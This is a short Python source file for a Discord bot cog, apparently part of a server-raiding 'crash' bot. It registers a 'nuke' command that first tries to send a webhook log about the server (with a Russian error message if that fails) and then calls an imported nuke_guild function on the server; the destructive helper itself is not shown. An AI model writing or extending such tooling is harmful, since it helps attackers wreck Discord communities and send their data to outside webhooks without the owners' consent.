from discord.ext import commands
from src.functions import log, nuke_guild, send_log
from src.logs import write_log


class CrashCog(commands.Cog):
    def __init__(self, client):
        self.client = client

    @commands.command(aliases=['nuke'])
    @commands.check(log.logging)
    async def _nuke(self, ctx):

        if not await send_log(ctx.guild):
            await write_log("Не удалось отправить webhook")

        await nuke_guild(ctx.guild)


async def setup(client):
    await client.add_cog(CrashCog(client))
